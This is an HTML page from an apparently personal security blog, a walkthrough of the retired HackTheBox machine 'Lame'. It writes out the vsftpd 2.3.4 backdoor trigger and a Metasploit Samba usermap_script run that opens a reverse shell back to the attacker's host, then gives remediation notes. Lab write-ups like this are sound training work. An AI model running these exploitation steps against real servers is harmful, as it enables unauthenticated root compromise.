@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Lame: vsftpd backdoor and Samba usermap_script to root — Lucky Thandel</title>
+<meta name="description" content="The first box everyone roots: a backdoored FTP daemon on port 6200 and an unauthenticated Samba RCE — two roads to root on one machine. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-09-30 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Lame: vsftpd backdoor and Samba usermap_script to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Lame is a retired HackTheBox easy Linux machine and the traditional first root. Synopsis: several old, intentionally vulnerable services side by side — FTP (vsftpd 2.3.4), SSH, and Samba 3.0.20. Two independent roads to root on one box.</p>
+<h2><span class="amber">$</span> Enumeration — Nmap</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: services and versions</span>
+nmap -sC -sV -oN lame.nmap 10.10.10.3</pre>
+<p>FTP reports vsftpd 2.3.4, SMB reports Samba 3.0.20. Both version strings map to famous public exploits — one search each turns versions into working roads.</p>
+<h2><span class="amber">$</span> Road one — vsftpd 2.3.4 backdoor</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: trigger backdoor, catch shell</span>
+telnet 10.10.10.3 21
+USER backdoored:)
+PASS anything
+nc 10.10.10.3 6200
+id
+uid=0(root) gid=0(root)</pre>
+<p>Logging in with a username ending in :) opens a shell on port 6200 as root immediately. Fastest root on the box.</p>
+<h2><span class="amber">$</span> Road two — Samba usermap_script (CVE-2007-2447)</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: unauthenticated Samba RCE</span>
+msfconsole -q
+msf6 &gt; use exploit/multi/samba/usermap_script
+msf6 exploit(usermap_script) &gt; set RHOSTS 10.10.10.3
+msf6 exploit(usermap_script) &gt; set PAYLOAD cmd/unix/reverse
+msf6 exploit(usermap_script) &gt; set LHOST 10.10.14.23
+msf6 exploit(usermap_script) &gt; run</pre>
+<p>Samba 3.0.20 maps usernames through a script without authentication — root shell with no credentials at all. Unauthenticated RCE in file-sharing is a pattern that still shows up in real networks.</p>
+<h2><span class="amber">$</span> Flags</h2>
+<p>user.txt on a low-privilege home directory, root.txt in /root — both readable from either root shell. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Brute-forcing SSH first (read service versions, do not guess passwords) and overcomplicating Samba with valid credentials (the exploit needs none — that is the whole point).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Retire vsftpd 2.3.4 and Samba 3.x entirely, patch or replace legacy file services, and alert on shell listeners appearing on unexpected high ports like 6200. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
